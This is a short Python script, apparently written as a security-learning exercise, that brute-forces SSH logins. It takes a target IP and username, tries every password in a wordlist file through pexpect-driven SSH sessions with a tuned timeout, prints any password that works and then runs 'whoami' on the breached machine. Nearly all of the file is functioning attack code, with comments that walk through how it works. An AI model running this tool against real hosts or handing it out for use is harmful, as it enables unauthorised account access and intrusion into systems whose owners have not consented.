# This is very similar to the sshlogin.py, which has more specific notes
#!/usr/bin/python3
# -------------------------------------------------------------
# Imports
import pexpect
from termcolor import colored  # add colors to printouts to make it more readable
# -------------------------------------------------------------
# After password, we expect a return prompt (options) from the target machine meaning that we are logged in.
PROMPT = ['#', '>>>', '>', '\$']
# -------------------------------------------------------------
# If we can access a target IP/user, we can then send a terminal command to that child.


def send_command(child, command):       # child  AKA  the connection
    # Send the connection, and the command to use on that connection
    child.sendline(command)
    child.expect(PROMPT)  # We expect one of those options as a response after our command.
    print(f'{child.before}')  # print the output of the command on the target system
# --------------------------------------------------------------


def connect(host, user, password):
    ssh_newkey = "Are you sure you want to continue connecting"  # question from trying to ssh into target
    connStr = "ssh " + user + "@" + host    # EX.    ssh ncterry@10.0.2.7
    child = pexpect.spawn(connStr)          # Send ssh command to target, to spawn a connection child
    ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword: '])
    if ret == 0:  # IF return value is 0, then we cannot connect
        print(f'[-] Error Connecting')
        return
    if ret == 1:
        child.sendline('yes')
        # yes we wnat to continue, then we expect a password request next.
        ret = child.expect([pexpect.TIMEOUT, '[P|p]assword: '])
        if ret == 0:
            print(f'[-] Error Connecting')
            return
    child.sendline(password)  # Send password to finish the login.
    # bruteforce needs a timeout so we will not sift through the file and try to login with passwords too fast.
    # Basically just add a delay to the program  does not try to login too fast.
    # Timeout can be adjusted.   0.2 was too fast for our machine, but 0.5 was able to login
    child.expect(PROMPT, timeout=0.5)
    return child
# -------------------------------------------------------------


def main():
    """ WE ask for the target/user and then sift through the password file, and try each line.
    We try each line in the file below, as stated in the for loop.
    We needed to strip the newline from the line in the file, as it may try to login using password\n
    Each line gets sent to try and connect using the function we created above.
    if we do get in, we are also going to input a simple   whoami   command, just because."""
    host = input("Enter IP Address of Target to Bruteforce: ")
    user = input("Enter User Account in IP that You want to Bruteforce: ")
    file = open("sshbrutePasswords.txt", "r")
    # Read passwords in file line by line
    for password in file.readlines():
        password = password.strip('\n')
        try:  # If we cannot connect to target i.e. create the child, then the TRY fails.
            child = connect(host, user, password)
            print(colored("[+] Password found : " + password, 'green'))
            send_command(child, "whoami")
        except:
            print(colored("[-] Wrong Password: " + password, 'red'))
# -------------------------------------------------------------

main()

# -------------------------------------------------------------
